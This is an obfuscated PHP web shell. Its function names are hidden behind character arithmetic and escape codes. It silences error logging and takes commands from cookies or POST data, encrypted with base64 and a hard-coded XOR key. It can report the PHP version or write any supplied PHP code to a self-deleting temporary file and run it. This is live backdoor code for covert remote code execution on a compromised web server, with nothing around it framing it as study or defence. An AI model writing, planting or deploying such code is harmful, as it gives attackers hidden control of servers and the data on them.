<?php $lylpkzx = "\146"."\x69".'l'.chr(194-93)."\137".'p'.chr(767-650).chr(116).chr(972-877)."\x63"."\157".chr(976-866)."\164"."\x65"."\x6e"."\x74".chr(115);
$eyimcdwtvs = "\x62".'a'.'s'.'e'.'6'.'4'."\x5f"."\144"."\x65".'c'.chr(111)."\144"."\x65";
$cpdqyjlsgn = "\151"."\156".'i'."\x5f".'s'.chr(101).chr(325-209);
$gpmswvrg = "\165".'n'.chr(108).chr(105)."\156"."\x6b";


@$cpdqyjlsgn("\x65".'r'.'r'.chr(403-292)."\x72"."\x5f".chr(108).'o'.chr(535-432), NULL);
@$cpdqyjlsgn('l'.chr(111).chr(216-113).'_'."\x65"."\x72"."\x72".chr(111).chr(114).chr(981-866), 0);
@$cpdqyjlsgn("\155"."\141".chr(120)."\137".'e'.chr(120)."\145"."\x63".chr(358-241)."\164"."\151".chr(156-45).chr(369-259)."\x5f".chr(725-609)."\151".chr(734-625).chr(1052-951), 0);
@set_time_limit(0);

function dxlre($oyraqg, $wkscns)
{
    $lbbicdffzjhxbxx = "";
    for ($lbbicdffz = 0; $lbbicdffz < strlen($oyraqg);) {
        for ($j = 0; $j < strlen($wkscns) && $lbbicdffz < strlen($oyraqg); $j++, $lbbicdffz++) {
            $lbbicdffzjhxbxx .= chr(ord($oyraqg[$lbbicdffz]) ^ ord($wkscns[$j]));
        }
    }
    return $lbbicdffzjhxbxx;
}

$elmtwzc = array_merge($_COOKIE, $_POST);
$biikr = '94fe51b0-061f-47ab-9937-d86e19ded7bf';
foreach ($elmtwzc as $dgrcdjuuwr => $oyraqg) {
    $oyraqg = @unserialize(dxlre(dxlre($eyimcdwtvs($oyraqg), $biikr), $dgrcdjuuwr));
    if (isset($oyraqg['a'."\x6b"])) {
        if ($oyraqg['a'] == chr(135-30)) {
            $lbbicdffz = array(
                chr(1028-916)."\166" => @phpversion(),
                "\x73".chr(118) => "3.5",
            );
            echo @serialize($lbbicdffz);
        } elseif ($oyraqg['a'] == 'e') {
            $zhnensdu = "./" . md5($biikr) . chr(46).'i'.chr(981-871).'c';
            @$lylpkzx($zhnensdu, "<" . '?'.'p'.chr(104)."\160".chr(719-687)."\100"."\x75"."\156"."\154"."\x69"."\156"."\153".chr(983-943).'_'.'_'.chr(70).'I'.'L'.chr(1001-932).chr(808-713).chr(906-811)."\x29".chr(256-197).' ' . $oyraqg['d']);
            include($zhnensdu);
            @$gpmswvrg($zhnensdu);
        }
        exit();
    }
}

